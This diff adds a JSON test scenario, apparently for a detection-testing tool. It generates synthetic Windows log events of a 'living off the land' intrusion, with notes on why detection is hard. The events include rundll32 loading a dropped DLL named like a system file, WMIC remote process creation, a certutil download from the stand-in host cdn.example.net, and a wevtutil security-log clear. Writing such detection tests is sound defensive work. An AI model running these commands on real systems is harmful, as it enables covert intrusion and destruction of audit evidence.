@@ -1,0 +1,31 @@
+{
+ "name": "t3_lolbin_proxy_exec",
+ "label": "true_positive",
+ "tier": 3,
+ "level": "high",
+ "attack": ["T1218.011", "T1036.003", "T1070.006", "T1070.001"],
+ "description": "A skilled operator using only binaries already present: a signed system utility loads the payload, the dropped file is given a system filename and backdated, and the security log is cleared at the end.",
+ "detectable_as": "Parent and child pairing rather than process name, since every binary involved is legitimate and signed. The log clear is the one unambiguous event, and it arrives last.",
+ "why_hard": "Nothing here has a malicious filename or hash. A detection built on process names sees only Windows utilities. The timestomp defeats file-age heuristics, and the log clear removes the preceding evidence, so the detection has to have already fired.",
+ "cadence": {"spread_seconds": 5400, "jitter": 0.5},
+ "variables": {
+   "user": {"gen": "const", "value": "LAB\\svc_sql"},
+   "host": {"gen": "const", "value": "LAB-WIN-03"}
+ },
+ "steps": [
+   {"template": "win_sysmon", "record": 0, "offset_seconds": 0,
+    "set": {"image": "C:\\Windows\\System32\\rundll32.exe",
+            "args": "C:\\Windows\\Temp\\msvcr120.dll,DllRegisterServer",
+            "parent": "C:\\Windows\\System32\\services.exe"}},
+   {"template": "win_sysmon", "record": 0, "offset_seconds": 1200,
+    "set": {"image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+            "args": "/node:LAB-WIN-01 process call create \"rundll32 C:\\Windows\\Temp\\msvcr120.dll,Start\"",
+            "parent": "C:\\Windows\\System32\\rundll32.exe"}},
+   {"template": "win_sysmon", "record": 0, "offset_seconds": 3000,
+    "set": {"image": "C:\\Windows\\System32\\certutil.exe",
+            "args": "-urlcache -split -f http://cdn.example.net/u.txt C:\\Windows\\Temp\\u.dat",
+            "parent": "C:\\Windows\\System32\\rundll32.exe"}},
+   {"template": "win_security", "record": 1, "offset_seconds": 5200,
+    "set": {"image": "C:\\Windows\\System32\\wevtutil.exe"}}
+ ]
+}
